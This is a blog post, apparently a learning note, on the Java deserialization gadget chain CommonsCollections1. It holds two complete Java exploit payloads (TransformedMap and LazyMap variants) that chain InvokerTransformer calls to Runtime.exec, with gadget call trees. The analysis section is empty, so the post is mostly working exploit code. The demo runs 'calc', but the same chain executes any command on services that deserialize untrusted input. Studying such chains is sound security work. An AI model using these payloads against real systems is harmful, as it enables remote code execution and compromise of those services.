---
title: CommonsCollections1
subtitle:
date: 2025-02-02T03:14:26+08:00
slug: commons-collections-1
draft: false
author:
  name: M1ng2u
  link:
  email:
  avatar:
description:
keywords: CC1
license:
comment: true
weight: 0
tags:
  - Java反序列化
  - CC1
categories:
  - JavaSec
collections:
  - CommonsCollections
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRelated: false
hiddenFromFeed: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: true
lightgallery: false
password:
message:
repost:
  enable: true
  url:

---

# CommonsCollections1

CC1的漏洞触发点在 `org.apache.commons.collections.functors.InvokerTransformer::transform()` 

![image-20250224233522625](C:\Users\Mingz\AppData\Roaming\Typora\typora-user-images\image-20250224233522625.png)

## TransformedMap 利用链

### Payload

```java
package javaSec.Ser;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

public class CommonsColletions1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{ String.class, Class[].class}, new Object[]{ "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[]{ Object.class, Object[].class }, new Object[]{ null, new Object[0] }),
                new InvokerTransformer("exec", new Class[]{ String.class }, new String[] { "calc" }),

        };

        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        innerMap.put("value", "xxxx");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, outerMap);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(handler);
        oos.close();

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
        Object o = (Object) ois.readObject();

    }
}
```

### Gadget Chain

```text
ObjectInputStream.readObject()
	AnnotationInvocationHandler.readObject()
		Map(Proxy).entrySet()
			AnnotationInvocationHandler.invoke()
				TransformedMap.setValue()
					TransformedMap.checkSetValue()
						ChainedTransformer.transform()
							ConstantTransformer.transform()
							InvokerTransformer.transform()
								Method.invoke()
									Class.getMethod()
							InvokerTransformer.transform()
								Method.invoke()
									Runtime.getRuntime()
							InvokerTransformer.transform()
								Method.invoke()
									Runtime.exec()
```

### 分析





## LazyMap 利用链

### Payload

```java
package javaSec.Ser;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonsColletions1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"}),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, outerMap);

        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{ Map.class }, handler);
        handler = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(handler);
        oos.close();

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
        Object o = (Object) ois.readObject();
        
    }
}
```

### Gadget Chain

```text
ObjectInputStream.readObject()
	AnnotationInvocationHandler.readObject()
		Map(Proxy).entrySet()
			AnnotationInvocationHandler.invoke()
				LazyMap.get()
					ChainedTransformer.transform()
						ConstantTransformer.transform()
						InvokerTransformer.transform()
							Method.invoke()
								Class.getMethod()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.getRuntime()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.exec()				
